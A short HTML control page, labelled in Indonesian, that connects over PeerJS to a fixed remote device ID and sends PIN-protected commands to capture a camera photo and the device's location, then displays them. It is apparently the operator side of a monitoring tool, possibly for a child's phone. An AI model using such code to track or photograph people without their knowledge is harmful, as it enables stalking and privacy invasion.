<!DOCTYPE html>
<html>
<head>
    <title>Remote Dashboard</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body style="background:#111; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2>üéÆ CONTROL CENTER</h2>
    <p id="status" style="color:red">Terputus</p>
    <button onclick="konek()" style="padding:15px; background:blue; color:#fff; border:none;">1. HUBUNGKAN</button>
    <br><br>
    <button onclick="kirim('FOTO')" style="padding:15px; background:green; color:#fff; border:none;">üì∏ AMBIL FOTO</button>
    <button onclick="kirim('LOKASI')" style="padding:15px; background:orange; color:#000; border:none;">üìç CEK LOKASI</button>
    <div id="hasil" style="margin-top:20px"></div>

    <script>
        const TARGET = "anak_hayabusa_secure_007";
        const PIN = "1234";
        let peer = new Peer();
        let conn;

        function konek() {
            conn = peer.connect(TARGET);
            conn.on('open', () => {
                document.getElementById('status').innerText = "TERHUBUNG ‚úÖ";
                document.getElementById('status').style.color = "lime";
            });
            conn.on('data', (d) => {
                if(d.type === "FOTO") document.getElementById('hasil').innerHTML = `<img src="${d.data}" width="300">`;
                if(d.type === "LOKASI") document.getElementById('hasil').innerHTML = `<a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" style="color:cyan">Buka Lokasi</a>`;
            });
        }

        function kirim(c) {
            if(conn && conn.open) conn.send({cmd:c, pin:PIN});
            else alert("Klik Hubungkan dulu!");
        }
    </script>
</body>
</html>
